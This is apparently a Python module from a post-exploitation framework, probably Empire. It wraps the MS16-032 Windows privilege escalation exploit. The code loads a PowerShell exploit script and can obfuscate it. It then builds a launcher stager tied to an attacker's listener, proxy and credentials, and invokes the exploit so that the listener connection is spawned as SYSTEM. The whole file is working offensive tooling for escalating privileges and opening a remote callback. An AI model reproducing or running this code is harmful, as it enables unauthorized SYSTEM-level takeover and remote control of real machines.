from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MS16032',

            'Author': ['@FuzzySec', '@leoloobeek'],

            'Description': ('Spawns a new Listener as SYSTEM by'
                            ' leveraging the MS16-032 local exploit.'
                            ' Note: ~1/6 times the exploit won\'t work, may need to retry.'),
            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'Credit to James Forshaw (@tiraniddo) for exploit discovery and',
                'to Ruben Boonen (@FuzzySec) for PowerShell PoC',
                'https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html',
                'https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS16032.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # generate the launcher code without base64 encoding
        l = self.mainMenu.stagers.stagers['multi/launcher']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        l.options['Base64']['Value'] = 'False'
        launcherCode = l.generate()

        # need to escape characters
        launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
        
        scriptEnd = 'Invoke-MS16032 -Command "' + launcherCode + '"'
        scriptEnd += ';`nInvoke-MS16032 completed.'
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
